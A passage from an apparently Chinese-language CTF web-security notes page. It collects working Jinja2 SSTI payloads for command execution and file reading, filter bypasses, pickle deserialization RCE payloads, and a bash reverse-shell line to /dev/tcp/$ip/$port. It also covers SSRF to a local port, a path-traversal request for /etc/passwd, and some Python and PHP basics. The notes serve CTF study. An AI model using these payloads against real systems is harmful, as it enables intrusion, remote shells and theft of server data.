</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>path</span><span class=p>,</span> <span class=n>dirs</span><span class=p>,</span> <span class=n>files</span> <span class=ow>in</span> <span class=n>os</span><span class=o>.</span><span class=n>walk</span><span class=p>(</span><span class=n>folder</span><span class=p>,</span> <span class=n>topdown</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span> <span class=c1># 分别返回目录路径, 当前目录所有子目录名, 当前目录所有文件名, 从下到上遍历</span>
</span></span><span class=line><span class=cl><span class=n>file_save_path</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>folder</span><span class=p>,</span> <span class=n>file</span><span class=p>)</span> <span class=c1># 构建文件保存路径</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>file_save_path</span><span class=p>)</span> <span class=c1># 文件保存在路径中</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>relpath</span><span class=p>(</span><span class=n>file_path</span><span class=p>,</span> <span class=n>folder</span><span class=p>])</span> <span class=c1># 将文件绝对路径替换为关于folder的相对路径</span>
</span></span><span class=line><span class=cl><span class=c1># debug终端下, 直接输入os.system(&#39;xx&#39;)只会返回0, 表示成功</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 命令列表形式传入</span>
</span></span><span class=line><span class=cl><span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s1>&#39;cat&#39;</span><span class=p>,</span> <span class=s1>&#39;flag&#39;</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>            <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span>  <span class=c1># 捕获标准输出</span>
</span></span><span class=line><span class=cl>            <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>  <span class=c1># 捕获标准错误</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>  <span class=c1># 显示 cat flag 命令输出</span></span></span></code></pre></div></div><h3 id=ssti模板注入>SSTI模板注入</h3><ul><li>flask框架，Server-Side Template Injection，服务端模板注入</li></ul><h4 id=jinja2>Jinja2</h4><p>3种语法</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-jinja2"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-jinja2 data-lang=jinja2>{% %} {# 控制结构 #}
{{ }} {# 变量取值 #}</code></pre></div><p>内置函数及属性</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=vm>__class__</span> <span class=c1># 调用的参数类型</span>
</span></span><span class=line><span class=cl><span class=vm>__bases__</span> <span class=c1># 基类列表</span>
</span></span><span class=line><span class=cl><span class=n>__subclasses__</span><span class=p>()</span> <span class=c1># 子类列表</span>
</span></span><span class=line><span class=cl><span class=vm>__globals__</span> <span class=c1># 字典形式返回函数所在全局命名空间所定义的全局变量</span>
</span></span><span class=line><span class=cl><span class=n>__builtins__</span> <span class=c1># 内建模块引用</span></span></span></code></pre></div></div><p><strong>漏洞点</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># {{id | safe}} 中 safe 表示值直接插入到HTML中, 不做任何转义, 可造成SSTI攻击</span>
</span></span><span class=line><span class=cl><span class=n>evil</span> <span class=o>=</span> <span class=n>content</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;{{id | safe}}&#39;</span><span class=p>,</span> <span class=nb>id</span><span class=p>)</span> <span class=c1># 将模板内容中的{{id | safe}}替换为id</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>evil</span><span class=p>)</span> <span class=c1># 将替换后的字符串作为Jinja2模板渲染</span></span></span></code></pre></div></div><p>测试是否是SSTI：<code>{{7 * 7}}</code> 是否返回 <code>49</code>或<code>{{7+7}}</code>是否返回<code>14</code></p><p><strong>os模块执行命令</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=p>{{</span><span class=n>config</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;whoami&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</span></span><span class=line><span class=cl><span class=c1># 配置对象 &gt; 类 &gt; 初始化构造函数 &gt; 全局命名空间 &gt; os.popen(&#39;whoami&#39;).read() 执行命令</span></span></span></code></pre></div></div><p><strong>列举目录</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-jinja2"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-jinja2 data-lang=jinja2>{# 列举目录 #}
{{ c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).listdir(&#39;/&#39;) }}</code></pre></div><p><strong>绕沙箱读取服务器代码</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-jinja2"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-jinja2 data-lang=jinja2>{# 空列表[] &gt; list类 &gt; 基类object &gt; 所有object子类 #}
{% for c in [].__class__.__base__.__subclasses__() %}
   {% if c.__name__==&#39;catch_warnings&#39; %}
    {{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}
   {% endif %}
{% endfor %}

{# payload #}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;app.py&#39;,&#39;r&#39;).read() }}{% endif %}{% endfor %}</code></pre></div><h4 id=绕过>绕过</h4><ul><li>有黑名单过滤</li></ul><p><strong>字符串拼接</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-jinja2"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-jinja2 data-lang=jinja2>&#39;o&#39;+&#39;s&#39;
&#39;__imp&#39;+&#39;ort__&#39;
&#39;/fl&#39;+&#39;ag&#39;</code></pre></div><h3 id=反序列化漏洞>反序列化漏洞</h3><p><strong>Pickel序列化及反序列化</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Pet</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>name</span><span class=p>,</span> <span class=n>species</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>name</span> <span class=o>=</span> <span class=n>name</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>species</span> <span class=o>=</span> <span class=n>species</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pet</span> <span class=o>=</span> <span class=n>Pet</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>species</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 序列化</span>
</span></span><span class=line><span class=cl><span class=n>serialized_pet</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>pet</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 反序列化</span>
</span></span><span class=line><span class=cl><span class=n>pet_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>serialized_pet</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>pet</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>pet_data</span><span class=p>)</span></span></span></code></pre></div></div><p>RCE payload构造</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>exp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># # __reduce__() 序列化时返回一个元组(可调用函数和参数元组)，反序列化时参数传递调用该函数</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=p>(</span><span class=s2>&#34;whoami&#34;</span><span class=p>,))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>malicious_payload</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>exp</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>encoded_payload</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>malicious_payload</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span></span></span></code></pre></div></div><p>无回显时考虑替换全局变量，在网页中的某变量中显示信息</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>exp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>exec</span><span class=p>,</span> <span class=p>(</span><span class=s1>&#39;import os; global store; store = os.environ[&#34;FLAG&#34;]&#39;</span><span class=p>,))</span>
</span></span><span class=line><span class=cl><span class=c1># python在局部改变全局变量时需要声明 global</span></span></span></code></pre></div></div><p><strong>过滤</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pickle_data</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=p>{</span><span class=s2>&#34;os&#34;</span><span class=p>,</span><span class=s2>&#34;system&#34;</span><span class=p>,</span><span class=s2>&#34;eval&#34;</span><span class=p>,</span><span class=s2>&#34;setstate&#34;</span><span class=p>,</span><span class=s2>&#34;globals&#34;</span><span class=p>,</span><span class=s1>&#39;exec&#39;</span><span class=p>,</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>,</span><span class=s1>&#39;template&#39;</span><span class=p>,</span> <span class=s1>&#39;render&#39;</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;compile&#39;</span><span class=p>,</span><span class=s1>&#39;requests&#39;</span><span class=p>,</span><span class=s1>&#39;exit&#39;</span><span class=p>,</span><span class=s1>&#39;pickle&#39;</span><span class=p>,</span><span class=s2>&#34;class&#34;</span><span class=p>,</span><span class=s2>&#34;mro&#34;</span><span class=p>,</span><span class=s2>&#34;flask&#34;</span><span class=p>,</span><span class=s2>&#34;sys&#34;</span><span class=p>,</span><span class=s2>&#34;base&#34;</span><span class=p>,</span><span class=s2>&#34;init&#34;</span><span class=p>,</span><span class=s2>&#34;config&#34;</span><span class=p>,</span><span class=s2>&#34;session&#34;</span><span class=p>}:</span></span></span></code></pre></div></div><p><strong>利用subprocess</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>return</span> <span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>check_output</span><span class=p>,</span> <span class=p>([</span><span class=s2>&#34;cp&#34;</span><span class=p>,</span> <span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=s2>&#34;/app/app.py&#34;</span><span class=p>],))</span> <span class=c1># 直接返回命令的标准输出</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=p>(</span><span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>,</span> <span class=p>([</span><span class=s2>&#34;bash&#34;</span><span class=p>,</span> <span class=s2>&#34;-c&#34;</span><span class=p>,</span> <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#34;</span><span class=p>],))</span> <span class=c1># 反弹shell</span></span></span></code></pre></div></div><h3 id=文件包含漏洞>文件包含漏洞</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Plain"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Plain data-lang=Plain><span class=line><span class=cl># 直接访问服务器内部某端口文件
</span></span><span class=line><span class=cl>http://xxx/image?url=http://localhost:5728/image/flag.jpg </span></span></code></pre></div></div><h3 id=爬虫>爬虫</h3><p><strong>网页请求</strong></p><p><strong>网页请求</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;User-Agent&#39;</span><span class=p>:</span> <span class=s1>&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;Accept&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>proxies</span> <span class=o>=</span> <span class=p>{</span> <span class=c1># 代理查看http包</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;http&#39;</span><span class=p>:</span> <span class=s1>&#39;http://127.0.0.1:8080&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#39;https&#39;: &#39;https://https_proxy:port&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;arg1&#34;</span><span class=p>:</span><span class=s2>&#34;val1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;arg2&#34;</span><span class=p>:</span> <span class=s2>&#34;val2&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;arg3&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>a_variable</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># get</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;https://url&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># post</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://127.0.0.1:32585&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span> <span class=c1># json形式上传</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://127.0.0.1:32585&#34;</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=n>proxies</span><span class=p>)</span> <span class=c1># xx=xx&amp;xx=xx形式上传</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>cookies</span> <span class=c1># 获取cookies</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>response</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>cookies</span><span class=o>.</span><span class=n>get_dict</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;状态码: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span></span></span></code></pre></div></div><p><strong>爬虫匹配</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>bs4</span> <span class=kn>import</span> <span class=n>BeautifulSoup</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>soup</span> <span class=o>=</span> <span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>html_content</span><span class=p>,</span> <span class=s1>&#39;html.parser&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h1_tag</span> <span class=o>=</span> <span class=n>soup</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;h1&#39;</span><span class=p>,</span> <span class=nb>id</span><span class=o>=</span><span class=s1>&#39;status&#39;</span><span class=p>)</span>  <span class=c1># &lt;h1 id=&#34;status&#34;&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>h1_tag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>status_text</span> <span class=o>=</span> <span class=n>h1_tag</span><span class=o>.</span><span class=n>get_text</span><span class=p>(</span><span class=n>strip</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=c1># 获取标签内容并去除多余空白</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>status_text</span><span class=p>)</span></span></span></code></pre></div></div><h3 id=路径遍历漏洞>路径遍历漏洞</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=nx>xxx</span><span class=o>.</span><span class=nx>com</span><span class=o>?</span><span class=nx>path</span><span class=o>=../../../../../../../../</span><span class=nx>etc</span><span class=o>/</span><span class=nx>passwd</span></span></span></code></pre></div></div><h2 id=php>PHP</h2><p>环境搭建，在PHPSTUDY中的<strong>WWW</strong>界面下放入文件夹及代码即可</p><h3 id=基础知识-1>基础知识</h3><p>php版本7.3.22爬虫，首先检查<code>robots.txt(表示网站不希望哪些页面被爬取), source.txt</code></p><ul><li>隐藏源码：<code>x.php.swp</code></li><li>变量覆盖可以窃取信息</li></ul><p>一些<strong>基础代码</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-PHP"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span> <span class=c1>// 关闭所有错误报告
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>session_start</span><span class=p>();</span> <span class=c1>// 允许脚本访问和修改用户的会话数据
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>ob_start</span><span class=p>();</span> <span class=c1>// 开启输出缓冲，不从脚本发送任何输出
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s2>&#34;file.file&#34;</span><span class=p>);</span> <span class=c1>// 此文件包含file.file所有变量范围 
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>include_once</span> <span class=s2>&#34;xx.php&#34;</span><span class=p>;</span> <span class=c1>// 指定文件载入并执行其中程序，若文件已被包含则不再包含
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=s2>&#34;xx.php&#34;</span><span class=p>);</span> <span class=c1>// 将PHP代码高亮显示在网页
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>isset</span><span class=p>()</span> <span class=c1>// 判断一个变量是否已被设置, 且不为 null
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$arr</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$x</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>);</span> <span class=c1>// 数组[ $x, &#34;1&#34; ]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$$x</span> <span class=o>=</span> <span class=nv>$y</span><span class=p>;</span> <span class=c1>// $x=&#34;user&#34;, $y=&#34;admin&#34;, 则 $user = &#34;admin&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>strpos</span><span class=p>(</span><span class=nv>$content</span><span class=p>,</span> <span class=nv>$string</span><span class=p>);</span> <span class=c1>// 返回string在content第一次出现的索引, 否则返回false
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>trim</span><span class=p>(</span><span class=nx>addslashes</span><span class=p>(</span><span class=nv>$v</span><span class=p>));</span> <span class=c1>// 去除首尾空白字符, 对&#34;, &#39;, \, NULL添加反斜杠
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// PHP 数组或对象编码为 JSON 格式的字符串
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>json_encode</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;status&#39;</span> <span class=o>=&gt;</span> <span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;info&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;hello&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{</span><span class=nv>$k</span><span class=si>}</span><span class=s2>=</span><span class=si>{</span><span class=nv>$v</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>);</span> <span class=c1>// 定义环境变量
</span></span></span><span class=line><span class=cl><span class=c1># url传参: ?env[xxx]=`xxx`
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nx>unset</span><span class=p>(</span><span class=nv>$arr</span><span class=p>);</span> <span class=c1>// 清除变量
</span></span></span><span class=line><span class=cl><span class=c1></span>
